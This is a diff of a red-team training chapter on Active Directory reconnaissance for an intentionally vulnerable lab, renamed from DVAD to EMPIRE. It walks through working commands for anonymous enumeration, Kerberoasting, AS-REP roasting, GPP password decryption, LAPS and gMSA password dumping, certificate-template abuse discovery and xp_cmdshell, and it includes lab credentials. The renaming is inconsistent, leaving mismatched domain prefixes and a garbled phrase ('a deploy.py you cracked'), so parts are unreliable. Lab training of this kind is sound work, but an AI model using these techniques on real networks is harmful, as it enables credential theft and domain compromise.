@@ -5,7 +5,7 @@
 
 A methodical sweep from **"I have an IP range"** to **"I have a complete map of every user, group, computer, ACL, trust, share, service, certificate template, GPO link, and session in the forest."**
 
-This chapter covers the **80 ENUM-* flags and 15 REC-* flags** in DVAD's `PLAN.md`. It is the longest chapter in the book because — like Mudge says above — the recon step **is** the attack. Every chapter after this one assumes the data you collect here.
+This chapter covers the **80 ENUM-* flags and 15 REC-* flags** in EMPIRE's `PLAN.md`. It is the longest chapter in the book because — like Mudge says above — the recon step **is** the attack. Every chapter after this one assumes the data you collect here.
 
 The order is **outside-in**:
 
@@ -19,13 +19,13 @@ The order is **outside-in**:
 
 A defended Active Directory environment is **boring** at first sight. 100 servers, 5,000 users, 20,000 group memberships, dozens of GPOs, a few thousand cert templates and OUs. The vulnerability is *somewhere* in that graph — but you cannot see it without crawling the graph.
 
-A red-team engagement that allocates **2 hours** to recon and **38 hours** to exploitation will fail. The inverse — **35 hours of recon, 5 of exploit** — succeeds. DVAD intentionally hides flags in the *graph*: weird DACLs, oddly-named templates, forgotten GPO links, dangling computer accounts.
+A red-team engagement that allocates **2 hours** to recon and **38 hours** to exploitation will fail. The inverse — **35 hours of recon, 5 of exploit** — succeeds. EMPIRE intentionally hides flags in the *graph*: weird DACLs, oddly-named templates, forgotten GPO links, dangling computer accounts.
 
 Three principles drive this chapter:
 
 1. **Crawl, don't pivot.** Get the whole graph from one vantage point before moving to a second. Each pivot is an opportunity to be caught.
 2. **Cross-check.** The same fact (e.g., "peter.parker has GenericWrite on tony.stark") should be visible in LDAP raw, BloodHound, PowerView and nxc. If three disagree, one of them is lying — and the disagreement itself is a finding.
-3. **Persist your data.** Every enum command output goes to disk under `~/dvad/recon/<phase>/<target>/`. You will re-read it ten times during the engagement.
+3. **Persist your data.** Every enum command output goes to disk under `~/empire/recon/<phase>/<target>/`. You will re-read it ten times during the engagement.
 
 ---
 
@@ -49,7 +49,7 @@ Three principles drive this chapter:
 
 Each layer **multiplies** what you can see. Don't skip lower layers — they often hand you the key for the next.
 
-Critical fact: in DVAD, **Layer 2 (anonymous) already gives you most of the domain.** SMB null is enabled on dc01 and file01. LDAP anonymous bind exposes the naming contexts. RID cycling enumerates every user. That's enough to bruteforce, kerberoast, or land Responder-style coercion.
+Critical fact: in EMPIRE, **Layer 2 (anonymous) already gives you most of the domain.** SMB null is enabled on coruscant and scarif. LDAP anonymous bind exposes the naming contexts. RID cycling enumerates every user. That's enough to bruteforce, kerberoast, or land Responder-style coercion.
 
 ---
 
@@ -64,8 +64,8 @@ Critical fact: in DVAD, **Layer 2 (anonymous) already gives you most of the doma
 ### Initial sweep
 
 ```bash
-mkdir -p ~/dvad/recon/01-network
-cd ~/dvad/recon/01-network
+mkdir -p ~/empire/recon/01-network
+cd ~/empire/recon/01-network
 
 # ICMP+ARP live host discovery (Layer-2 segments only)
 nmap -sn 10.10.0.0/21 -oA live-corp
@@ -113,11 +113,11 @@ Sample output:
 Host script results:
 | smb-os-discovery:
 |   OS: Windows Server 2022 Datacenter Evaluation (Windows Server 2022 Datacenter Evaluation 6.3)
-|   Computer name: dc01
-|   NetBIOS computer name: DC01\x00
-|   Domain name: corp.local
-|   Forest name: corp.local
-|   FQDN: dc01.corp.local
+|   Computer name: coruscant
+|   NetBIOS computer name: coruscant\x00
+|   Domain name: empire.local
+|   Forest name: empire.local
+|   FQDN: coruscant.empire.local
 |_  System time: 2026-05-21T19:23:31+02:00
 ```
 
@@ -142,16 +142,16 @@ DNS on a DC almost always reveals:
 - Every domain controller (via `_ldap._tcp.dc._msdcs.<domain>` SRV records).
 - The forest layout (`_ldap._tcp.gc._msdcs` Global Catalog SRV records).
 - Every domain-joined host (A records under the AD-DNS zone — often readable anonymously).
-- Sometimes service hosts (e.g. `sql01.corp.local`, `web.finance.local`).
+- Sometimes service hosts (e.g. `kamino.empire.local`, `web.rebel.local`).
 
 ### Discovering DCs
 
 ```bash
-dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV
-dig @10.10.0.10 _ldap._tcp.dc._msdcs.finance.local SRV
-dig @10.10.0.10 _ldap._tcp.dc._msdcs.root.corp SRV
-dig @10.10.0.10 _kerberos._tcp.corp.local SRV
-dig @10.10.0.10 _gc._tcp.corp.local SRV
+dig @10.10.0.10 _ldap._tcp.dc._msdcs.empire.local SRV
+dig @10.10.0.10 _ldap._tcp.dc._msdcs.rebel.local SRV
+dig @10.10.0.10 _ldap._tcp.dc._msdcs.trade.corp SRV
+dig @10.10.0.10 _kerberos._tcp.empire.local SRV
+dig @10.10.0.10 _gc._tcp.empire.local SRV
 ```
 
 These SRV records are written by Netlogon during DC promotion. Their presence is **definitive proof** that 10.10.0.10 is a DC.
@@ -159,13 +159,13 @@ These SRV records are written by Netlogon during DC promotion. Their presence is
 ### Zone transfer (AXFR)
 
 ```bash
-dig @10.10.0.10 corp.local AXFR
-dig @10.10.0.10 _msdcs.corp.local AXFR
-dig @10.10.0.10 finance.local AXFR
-dig @10.10.0.10 root.corp AXFR
+dig @10.10.0.10 empire.local AXFR
+dig @10.10.0.10 _msdcs.empire.local AXFR
+dig @10.10.0.10 rebel.local AXFR
+dig @10.10.0.10 trade.corp AXFR
 ```
 
-Default Windows DNS *blocks* AXFR to non-DCs. DVAD intentionally leaves it open in some labs. If it works, you get **every A/CNAME record** in the zone — instant inventory of every host.
+Default Windows DNS *blocks* AXFR to non-DCs. EMPIRE intentionally leaves it open in some labs. If it works, you get **every A/CNAME record** in the zone — instant inventory of every host.
 
 ### Reverse PTR sweep
 
@@ -183,19 +183,19 @@ PTR records often exist when A records don't (e.g., DHCP-assigned workstations r
 If `dnsAdmin` rights or even **authenticated user** rights are sufficient (default), you can dump the AD-DNS zones via LDAP:
 
 ```bash
-adidnsdump -u 'corp\peter.parker' -p 'DVADlab2024!' 10.10.0.10
+adidnsdump -u 'corp\peter.parker' -p 'EmpireLab2024!' 10.10.0.10
 # Outputs records.csv with EVERY dnsNode under the zone
 ```
 
-`adidnsdump` reads the `dnsNode` objects under `CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local` — it bypasses any DNS-server-level ACL.
+`adidnsdump` reads the `dnsNode` objects under `CN=MicrosoftDNS,DC=DomainDnsZones,DC=empire,DC=local` — it bypasses any DNS-server-level ACL.
 
 ### DNS NS / MX / TXT — find federation hints
 
 ```bash
-dig @10.10.0.10 corp.local NS
-dig @10.10.0.10 corp.local MX
-dig @10.10.0.10 corp.local TXT
-dig @10.10.0.10 _msdcs.corp.local NS
+dig @10.10.0.10 empire.local NS
+dig @10.10.0.10 empire.local MX
+dig @10.10.0.10 empire.local TXT
+dig @10.10.0.10 _msdcs.empire.local NS
 ```
 
 TXT records sometimes leak SPF/DMARC and federation domains (Azure tenant IDs).
@@ -210,7 +210,7 @@ TXT records sometimes leak SPF/DMARC and federation domains (Azure tenant IDs).
 
 ```bash
 nxc smb 10.10.0.10 -u '' -p ''
-# 10.10.0.10  445  DC01  [+] CORP.LOCAL\: (null session)
+# 10.10.0.10  445  coruscant  [+] empire.local\: (null session)
 
 nxc smb 10.10.0.10 -u '' -p '' --shares
 nxc smb 10.10.0.10 -u '' -p '' --users
@@ -221,7 +221,7 @@ enum4linux-ng -A 10.10.0.10 -oJ corp-anon.json
 smbclient -L //10.10.0.10 -N
 ```
 
-On a default modern DC, `--users` and `--groups` are typically blocked (RestrictAnonymous=1 / 2). DVAD overrides this for several flag-bearing hosts.
+On a default modern DC, `--users` and `--groups` are typically blocked (RestrictAnonymous=1 / 2). EMPIRE overrides this for several flag-bearing hosts.
 
 ### Null bind on LDAP
 
@@ -232,18 +232,18 @@ ldapsearch -x -H ldap://10.10.0.10 -s base -b "" \
            supportedLDAPVersion supportedSASLMechanisms
 
 # Outputs:
-# namingContexts: DC=corp,DC=local
-# namingContexts: CN=Configuration,DC=corp,DC=local
-# namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
-# namingContexts: DC=DomainDnsZones,DC=corp,DC=local
-# namingContexts: DC=ForestDnsZones,DC=corp,DC=local
+# namingContexts: DC=empire,DC=local
+# namingContexts: CN=Configuration,DC=empire,DC=local
+# namingContexts: CN=Schema,CN=Configuration,DC=empire,DC=local
+# namingContexts: DC=DomainDnsZones,DC=empire,DC=local
+# namingContexts: DC=ForestDnsZones,DC=empire,DC=local
 ```
 
 That confirms the forest's naming contexts. From there:
 
 ```bash
 ldapsearch -x -H ldap://10.10.0.10 \
-           -b 'CN=Configuration,DC=corp,DC=local' \
+           -b 'CN=Configuration,DC=empire,DC=local' \
            -s sub '(objectClass=*)' dn
 ```
 
@@ -259,15 +259,15 @@ impacket-lookupsid '@10.10.0.10' -no-pass 20000
 nxc smb 10.10.0.10 -u '' -p '' --rid-brute 20000
 ```
 
-RID cycling walks `S-1-5-21-<domain>-1000`, `…-1001`, etc., querying `LsarLookupSids2`. Each SID resolves to a sAMAccountName. Default Windows since 2003 binds this to authenticated users only; DVAD leaves it open as a flag path.
+RID cycling walks `S-1-5-21-<domain>-1000`, `…-1001`, etc., querying `LsarLookupSids2`. Each SID resolves to a sAMAccountName. Default Windows since 2003 binds this to authenticated users only; EMPIRE leaves it open as a flag path.
 
 You should now have:
 
 ```
-S-1-5-21-...-500   CORP\Administrator    (User)
-S-1-5-21-...-512   CORP\Domain Admins    (Group)
-S-1-5-21-...-1000  CORP\WS01$            (Computer)
-S-1-5-21-...-1116  CORP\svc_jarvis          (User)
+S-1-5-21-...-500   EMPIRE\Administrator    (User)
+S-1-5-21-...-512   EMPIRE\Domain Admins    (Group)
+S-1-5-21-...-1000  EMPIRE\tatooine$            (Computer)
+S-1-5-21-...-1116  EMPIRE\svc_jarvis          (User)
 …
 ```
 
@@ -279,13 +279,13 @@ S-1-5-21-...-1116  CORP\svc_jarvis          (User)
 nxc smb 10.10.0.10 -u '' -p '' --pass-pol
 ```
 
-Tells you `MinPasswordLength`, `LockoutThreshold`, `LockoutDuration`. **Critical** before any brute-force — knowing the lockout threshold tells you whether spraying 3 passwords/account is safe (most DVAD policies allow 5 before lockout).
+Tells you `MinPasswordLength`, `LockoutThreshold`, `LockoutDuration`. **Critical** before any brute-force — knowing the lockout threshold tells you whether spraying 3 passwords/account is safe (most EMPIRE policies allow 5 before lockout).
 
 ---
 
 ## 8.5 Layer 3 — Authenticated LDAP
 
-You have low-priv credentials (e.g., `peter.parker:DVADlab2024!`) — from a Responder hash you cracked, a leaked SYSVOL `Groups.xml`, or DVAD's documented seed.
+You have low-priv credentials (e.g., `peter.parker:EmpireLab2024!`) — from a deploy.py you cracked, a leaked SYSVOL `Groups.xml`, or EMPIRE's documented seed.
 
 ### Why raw LDAP first, BloodHound second?
 
@@ -349,10 +349,10 @@ Memorise the four common ones: **2 disabled, 524288 unconstrained, 4194304 AS-RE
 
 ```bash
 # Setup
-USER='peter.parker@corp.local'
-PASS='DVADlab2024!'
+USER='peter.parker@empire.local'
+PASS='EmpireLab2024!'
 DC=10.10.0.10
-BASE='DC=corp,DC=local'
+BASE='DC=empire,DC=local'
 LDAP="ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE"
 
 # Domain object — get domainSID, ms-DS-MachineAccountQuota, lockout policy
@@ -414,9 +414,9 @@ $LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
 Save everything to disk:
 
 ```bash
-mkdir -p ~/dvad/recon/03-ldap
+mkdir -p ~/empire/recon/03-ldap
 for query in domain users groups computers asrep kerberoastable unconstrained constrained rbcd trusts admincount gmsa; do
-  : # run the appropriate command, redirect to ~/dvad/recon/03-ldap/$query.ldif
+  : # run the appropriate command, redirect to ~/empire/recon/03-ldap/$query.ldif
 done
 ```
 
@@ -424,15 +424,15 @@ done
 
 ```bash
 # ldapdomaindump — HTML and JSON of every user/group/computer
-ldapdomaindump -u 'corp\peter.parker' -p 'DVADlab2024!' 10.10.0.10 -o ~/dvad/recon/03-ldap/ldd
+ldapdomaindump -u 'corp\peter.parker' -p 'EmpireLab2024!' 10.10.0.10 -o ~/empire/recon/03-ldap/ldd
 
 # ldeep — cache + queries
-ldeep ldap -d corp.local -u peter.parker -p 'DVADlab2024!' -s 10.10.0.10 --all corp-cache
-ldeep cache -d corp.local corp-cache users
-ldeep cache -d corp.local corp-cache computers
-ldeep cache -d corp.local corp-cache groups
-ldeep cache -d corp.local corp-cache trusts
-ldeep cache -d corp.local corp-cache delegations
+ldeep ldap -d empire.local -u peter.parker -p 'EmpireLab2024!' -s 10.10.0.10 --all corp-cache
+ldeep cache -d empire.local corp-cache users
+ldeep cache -d empire.local corp-cache computers
+ldeep cache -d empire.local corp-cache groups
+ldeep cache -d empire.local corp-cache trusts
+ldeep cache -d empire.local corp-cache delegations
 ```
 
 `ldeep` lets you query a *cached* dump later without re-hitting the DC — invaluable on noisy red teams.
@@ -458,7 +458,7 @@ $LDAP="ldapsearch -x -H ldaps://$DC -D $USER -w $PASS -b $BASE \
 
 ```bash
 # kerbrute infers user existence by AS-REQ response codes
-kerbrute userenum --dc 10.10.0.10 -d corp.local users.txt -o kerb-users.txt
+kerbrute userenum --dc 10.10.0.10 -d empire.local users.txt -o kerb-users.txt
 ```
 
 Behaviour:
@@ -468,16 +468,16 @@ Behaviour:
 - Non-existent → `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6).
 - Disabled → `KDC_ERR_CLIENT_REVOKED` (18).
 
-Kerbrute lets you enumerate **without a password**. Useful when you don't even have `peter.parker:DVADlab2024!`.
+Kerbrute lets you enumerate **without a password**. Useful when you don't even have `peter.parker:EmpireLab2024!`.
 
 ### AS-REP roast every user with the flag
 
 ```bash
-impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -request -outputfile ~/dvad/recon/04-kerb/asrep.hash
+impacket-GetNPUsers empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -request -outputfile ~/empire/recon/04-kerb/asrep.hash
 
 # Without creds — only works if you have a userlist
-impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
+impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
 ```
 
 `-request` causes impacket to actually request the AS-REP (vs only enumerating UAC bits). Crack with hashcat mode 18200.
@@ -485,11 +485,11 @@ impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
 ### Kerberoast every SPN-bearing user
 
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -request -outputfile ~/dvad/recon/04-kerb/kerb.hash
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -request -outputfile ~/empire/recon/04-kerb/kerb.hash
 
 # With --usersfile to limit
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile kerb.hash -usersfile high-priv-spns.txt
 ```
 
@@ -528,12 +528,12 @@ BloodHound transforms 50,000 LDAP attributes into a graph of "who can act on who
 
 ```bash
 bloodhound-python \
-    -d corp.local \
-    -u peter.parker -p 'DVADlab2024!' \
+    -d empire.local \
+    -u peter.parker -p 'EmpireLab2024!' \
     -ns 10.10.0.10 \
     -c All --zip \
     --dns-tcp \
-    -o ~/dvad/recon/05-bloodhound/corp/
+    -o ~/empire/recon/05-bloodhound/corp/
 ```
 
 Options to know:
@@ -560,14 +560,14 @@ SharpHound can `LoggedOn` (calls `NetWkstaUserEnum`) — knowing *who is logged 
 
 ```bash
 # Finance via the external trust
-bloodhound-python -d finance.local -u 'peter.parker@corp.local' -p 'DVADlab2024!' \
+bloodhound-python -d rebel.local -u 'peter.parker@empire.local' -p 'EmpireLab2024!' \
                   -ns 10.20.0.10 -c All --zip \
-                  -o ~/dvad/recon/05-bloodhound/finance/
+                  -o ~/empire/recon/05-bloodhound/finance/
 
 # Root via the forest trust
-bloodhound-python -d root.corp -u 'peter.parker@corp.local' -p 'DVADlab2024!' \
+bloodhound-python -d trade.corp -u 'peter.parker@empire.local' -p 'EmpireLab2024!' \
                   -ns 10.30.0.10 -c All --zip \
-                  -o ~/dvad/recon/05-bloodhound/root/
+                  -o ~/empire/recon/05-bloodhound/root/
 ```
 
 Then **merge** all three zips in the same BloodHound instance — you get the inter-forest edges.
@@ -594,7 +594,7 @@ Then **merge** all three zips in the same BloodHound instance — you get the in
 - Find users with `msDS-KeyCredentialLink` writable by another principal.
 - List all certificate templates that are vulnerable to ESC1..ESC8.
 
-These map directly to DVAD flag families.
+These map directly to EMPIRE flag families.
 
 ### Cypher 101 — write your own
 
@@ -606,12 +606,12 @@ MATCH (u:User) WHERE u.description =~ '(?i).*password.*' RETURN u.name, u.descri
 MATCH p=(u:User)-[r:GenericWrite]->(c:Computer)
 RETURN u.name, c.name, type(r)
 
-// Path from peter.parker to any DA in corp.local
-MATCH p=shortestPath((u:User {name:'ALICE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
+// Path from peter.parker to any DA in empire.local
+MATCH p=shortestPath((u:User {name:'ALICE@empire.local'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@empire.local'}))
 RETURN p
 
 // Members of Domain Admins who do not have AdminCount=1 (recently added?)
-MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
+MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@empire.local'})
 WHERE u.admincount IS NULL OR u.admincount = false
 RETURN u.name
 
@@ -631,8 +631,8 @@ RETURN c.name, c.unconstraineddelegation, c.allowedtodelegate
 Always tag the BloodHound zip with collection date and source user (your edge perceptions change with your privileges):
 
 ```
-~/dvad/recon/05-bloodhound/corp/2026-05-21_corp_alice.zip
-~/dvad/recon/05-bloodhound/corp/2026-05-22_corp_bob.zip   # if you compromise tony.stark later
+~/empire/recon/05-bloodhound/corp/2026-05-21_corp_alice.zip
+~/empire/recon/05-bloodhound/corp/2026-05-22_corp_bob.zip   # if you compromise tony.stark later
 ```
 
 ---
@@ -640,13 +640,13 @@ Always tag the BloodHound zip with collection date and source user (your edge pe
 ## 8.8 Layer 4.5 — Certificate Services enumeration (ESC mapping)
 
 ```bash
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-             -stdout -text -output ~/dvad/recon/06-adcs/corp
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
+             -stdout -text -output ~/empire/recon/06-adcs/corp
 
-certipy ca -u peter.parker@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
+certipy ca -u peter.parker@empire.local -p 'EmpireLab2024!' -ca EMPIRE-CA -dc-ip 10.10.0.10 \
            -list-templates
 
-certipy ca -u peter.parker@corp.local -p 'DVADlab2024!' -ca CORP-CA -dc-ip 10.10.0.10 \
+certipy ca -u peter.parker@empire.local -p 'EmpireLab2024!' -ca EMPIRE-CA -dc-ip 10.10.0.10 \
            -officers
 ```
 
@@ -662,7 +662,7 @@ Output flags each template with the ESC bits that match. Sample:
 0
   Template Name                       : VulnerableESC1
   Display Name                        : Vulnerable ESC1
-  Certificate Authorities             : CORP-CA
+  Certificate Authorities             : EMPIRE-CA
   Enabled                             : True
   Client Authentication               : True
   Enrollment Agent                    : False
@@ -678,14 +678,14 @@ Output flags each template with the ESC bits that match. Sample:
   Renewal Period                      : 6 weeks
   Permissions
     Enrollment Permissions
-      Enrollment Rights              : CORP.LOCAL\Domain Users
+      Enrollment Rights              : empire.local\Domain Users
     Object Control Permissions
-      Owner                          : CORP.LOCAL\Administrator
-      Write Owner Principals         : CORP.LOCAL\Domain Admins
-      Write Dacl Principals          : CORP.LOCAL\Domain Admins
-      Write Property Principals      : CORP.LOCAL\Administrator
+      Owner                          : empire.local\Administrator
+      Write Owner Principals         : empire.local\Domain Admins
+      Write Dacl Principals          : empire.local\Domain Admins
+      Write Property Principals      : empire.local\Administrator
   [!] Vulnerabilities
-    ESC1                              : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+    ESC1                              : 'empire.local\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
 That `[!] Vulnerabilities` line is the gold. Each template gets tagged with the ESC IDs that apply. See chapter 06 for exploitation.
@@ -693,8 +693,8 @@ That `[!] Vulnerabilities` line is the gold. Each template gets tagged with the 
 Catalogue every CA + template in each forest:
 
 ```bash
-certipy find -u peter.parker@corp.local -p ... -dc-ip 10.20.0.10 -output finance-ca
-certipy find -u peter.parker@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
+certipy find -u peter.parker@empire.local -p ... -dc-ip 10.20.0.10 -output finance-ca
+certipy find -u peter.parker@empire.local -p ... -dc-ip 10.30.0.10 -output root-ca
 ```
 
 [Flags: ENUM-027 — cert template enum; ENUM-028 — CA list; ENUM-029 — officers list]
@@ -706,7 +706,7 @@ certipy find -u peter.parker@corp.local -p ... -dc-ip 10.30.0.10 -output root-ca
 ### SMB shares (authenticated)
 
 ```bash
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares \
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --shares \
     --filter-shares READ,WRITE
 ```
 
@@ -714,10 +714,10 @@ nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --shares \
 
 ```bash
 # Recursive read
-smbmap -u peter.parker -p 'DVADlab2024!' -H 10.10.0.13 -R --depth 4 -q
+smbmap -u peter.parker -p 'EmpireLab2024!' -H 10.10.0.13 -R --depth 4 -q
 
 # Targeted patterns
-smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
+smbclient -U peter.parker%'EmpireLab2024!' //scarif/share$ -c 'recurse;ls' \
     | grep -iE '\.config|\.xml|\.kdbx|\.ps1|unattend|password|cred|secret|backup'
 ```
 
@@ -737,7 +737,7 @@ smbclient -U peter.parker%'DVADlab2024!' //file01/share$ -c 'recurse;ls' \
 ### MSSQL surface
 
 ```bash
-impacket-mssqlclient corp.local/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
+impacket-mssqlclient empire.local/peter.parker:'EmpireLab2024!'@10.10.0.14 -windows-auth
 
 # Inside the client:
 SQL> SELECT @@version
@@ -752,8 +752,8 @@ SQL> SELECT srvname, srvproduct, providername, datasource FROM master..sysserver
 Useful nxc spray for MSSQL:
 
 ```bash
-nxc mssql 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --local-auth
-nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' -d corp.local -q 'SELECT @@version'
+nxc mssql 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --local-auth
+nxc mssql 10.10.0.14 -u peter.parker -p 'EmpireLab2024!' -d empire.local -q 'SELECT @@version'
 nxc mssql 10.10.0.14 -u sa -p '...' --xp_cmdshell 'whoami /all'
 ```
 
@@ -776,9 +776,9 @@ EXEC ('SELECT * FROM OPENROWSET(''SQLNCLI'', ''Server=...'', ''SELECT 1'')')
 ### WinRM / RDP / DCOM accessibility map
 
 ```bash
-nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
-nxc rdp 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --admin
+nxc winrm 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
+nxc rdp 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!'
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --admin
 ```
 
 `--admin` checks for the magic Local Administrators on the target. Reveals lateral targets.
@@ -788,7 +788,7 @@ nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --admin
 For every member server you reach, log:
 
 ```
-File01 (10.10.0.13)
+scarif (10.10.0.13)
   - SMB: yes
   - Shares: share$ (R, W), backup$ (R)
   - WinRM: yes (peter.parker not member of Remote Management Users)
@@ -810,7 +810,7 @@ The SYSVOL share is **world-readable** to every authenticated user. It contains 
 ### GPO/SYSVOL trawl
 
 ```bash
-smbclient -U peter.parker%'DVADlab2024!' //10.10.0.10/SYSVOL \
+smbclient -U peter.parker%'EmpireLab2024!' //10.10.0.10/SYSVOL \
     -c 'prompt OFF; recurse ON; mget *' -m SMB3
 ```
 
@@ -828,7 +828,7 @@ grep -r -h "cpassword" SYSVOL/ | grep -oP 'cpassword="\K[^"]+' \
     | while read cp; do gpp-decrypt "$cp"; done
 
 # Or one-shot
-impacket-Get-GPPPassword 'corp.local/peter.parker:DVADlab2024!@10.10.0.10'
+impacket-Get-GPPPassword 'empire.local/peter.parker:EmpireLab2024!@10.10.0.10'
 ```
 
 The AES-256 key for GPP encryption is **public** (Microsoft published it as part of the deprecation): `4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b`. Anything `cpassword=` in SYSVOL is decryptable.
@@ -888,7 +888,7 @@ $LDAP "(msLAPS-Password=*)" sAMAccountName msLAPS-Password msLAPS-PasswordExpira
 If you can read `ms-Mcs-AdmPwd`, you have local admin on that host. ACLs are usually scoped to a security group (`LAPS-Readers`).
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kdcHost 10.10.0.10 -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --kdcHost 10.10.0.10 -M laps
 ```
 
 NetExec's `laps` module reads, decrypts (LAPS v2), and dumps in one step.
@@ -903,7 +903,7 @@ $LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
 `msDS-GroupMSAMembership` is a security descriptor listing principals allowed to **read the password**. If you're in that group, you can derive the gMSA NT hash.
 
 ```bash
-gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -l 10.10.0.10
 # Outputs: gmsaaccount$:::NThash
 ```
 
@@ -929,17 +929,17 @@ Trust enum is where forest-wide attack paths reveal themselves.
 
 ```bash
 # All trusts in the partition
-$LDAP -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
+$LDAP -b "CN=System,DC=empire,DC=local" "(objectClass=trustedDomain)" \
       trustPartner trustDirection trustType trustAttributes \
       flatName securityIdentifier
 
 # Forest trust info — only available with a forest trust
-$LDAP -b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
+$LDAP -b "CN=System,DC=empire,DC=local" "(objectClass=trustedDomain)" \
       msDS-TrustForestTrustInfo
 
 # Cross-ref via nxc
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --query '(objectClass=trustedDomain)' '*'
 ```
 
 ### Interpreting trustAttributes (bitmask)
@@ -959,7 +959,7 @@ nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query '(objectClass=trus
 | 10 | 0x800 | PIM_TRUST |
 | 11 | 0x1000 | CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION |
 
-DVAD intentionally clears `QUARANTINED_DOMAIN` on a trust so SID filtering does **not** apply — enabling the SID-history forest-jump attack in chapter 12.
+EMPIRE intentionally clears `QUARANTINED_DOMAIN` on a trust so SID filtering does **not** apply — enabling the SID-history forest-jump attack in chapter 12.
 
 ### trustDirection
 
@@ -975,11 +975,11 @@ Inbound-only trust: their users can authenticate here. Outbound-only: our users 
 ### From a victim
 
 ```powershell
-Get-ADTrust -Filter * -Server corp.local |
+Get-ADTrust -Filter * -Server empire.local |
     Select-Object Name,Source,Target,Direction,TrustType,TrustAttributes,ForestTransitive
 
 # Forest-trust-specific info
-Get-ADTrust -Filter "TrustAttributes -bor 0x8" -Server corp.local |
+Get-ADTrust -Filter "TrustAttributes -bor 0x8" -Server empire.local |
     Get-ADForestTrustInfo
 ```
 
@@ -988,15 +988,15 @@ PowerView equivalents:
 ```powershell
 Get-NetDomainTrust
 Get-NetForestTrust
-Get-NetForestDomain -Forest corp.local
+Get-NetForestDomain -Forest empire.local
 ```
 
 ### ForeignSecurityPrincipal walk
 
-When a trusted-domain principal is granted access in the local domain, an FSP entry is created under `CN=ForeignSecurityPrincipals,DC=corp,DC=local`:
+When a trusted-domain principal is granted access in the local domain, an FSP entry is created under `CN=ForeignSecurityPrincipals,DC=empire,DC=local`:
 
 ```bash
-$LDAP -b "CN=ForeignSecurityPrincipals,DC=corp,DC=local" \
+$LDAP -b "CN=ForeignSecurityPrincipals,DC=empire,DC=local" \
       "(objectClass=foreignSecurityPrincipal)" objectSid memberOf
 ```
 
@@ -1013,15 +1013,15 @@ The single most valuable piece of recon for planning lateral movement: **where a
 ### NetSessionEnum (SMB sessions to this host)
 
 ```bash
-nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' --sessions
+nxc smb 10.10.0.0/21 -u peter.parker -p 'EmpireLab2024!' --sessions
 ```
 
-Returns the list of SMB sessions to each host — i.e., who is *connected* (typically anyone running `\\file01\share`). Default ACL since Server 2016 restricts this to local admins / Administrators, but legacy hosts permit it for Authenticated Users.
